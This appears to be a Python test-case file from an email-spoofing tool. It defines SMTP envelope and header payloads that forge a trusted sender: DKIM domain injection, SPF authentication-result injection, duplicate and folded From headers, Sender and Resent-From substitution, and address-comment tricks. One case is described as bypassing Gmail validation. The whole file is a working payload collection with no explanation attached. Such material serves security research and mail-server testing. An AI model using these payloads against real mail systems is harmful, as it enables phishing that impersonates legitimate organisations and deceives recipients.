from common.common import *

test_cases = {
    "case_a4": { # An example of DKIM authentication injection attack
        "case_name":b"DKIM authentication injection attack\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <security@legitimate.com>"},
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",

            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_a7": { # A example of SPF authentication results injection attack
        "case_name":b"SPF authentication results injection attack\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<@legitimate.com,@any.com:'any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: SPF authentication results injection attack\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_6e": { 
        "case_name":b"Exploiting normalization behavior with multiple email addresses.\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <any@attack.com>,\r\n\t<any2@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_6a": {
        "case_name":b"Preference of multiple From headers\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <any@attack.com>\r\nFrom: <admin@@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_6b": {
        "case_name":b"Inconsistent interpretation in folding-space-succeeded From header.\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From\n :<any@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_6c": {
        "case_name":b"Exploiting normalization behavior with space-succeeded From header.\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <admin@attack.com>\r\nFrom :<admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_6d": {
        "case_name":b"Interpreting Sender header as From alternative header.\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From\r\n :<any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <admin@legitimate.com>\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_6f": {
        "case_name":b"Combine multiple techniques to bypass Gmail validation.",
        "helo": b"attack.com",
        "mailfrom": b"<>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b" From: <any@attack.com>\r\nResent-From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_1a": {
        "case_name":b"From with double address + Sender + Resent-From",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b" From: <any@attack.com>\r\n\t<any2@attack.com\r\nResent-From: <admin-resent@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <admin-sender@legitimate.com",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_1b": {
        "case_name":b"From address with comment + Sender ",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b" From: <any(comment)@attack.com>@legitimate.com\r\n",
            "to_header": b"To: <victim@victim.com(comment)>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <admin-sender@legitimate.com",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_1c": {
        "case_name":b"From address with comment + Sender ",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b" From: <any(comment@attack.com>)@legitimate.com\r\n",
            "to_header": b"To: <victim@victim.com(comment)>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <admin-sender@legitimate.com",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_1d": {
        "case_name":b"Display name in From with comment",
        "helo": b"attack.com",
        "mailfrom": b"<test@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b" From: \"display(@abc.com)\" <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com(comment)>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <admin-sender@legitimate.com",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },



}

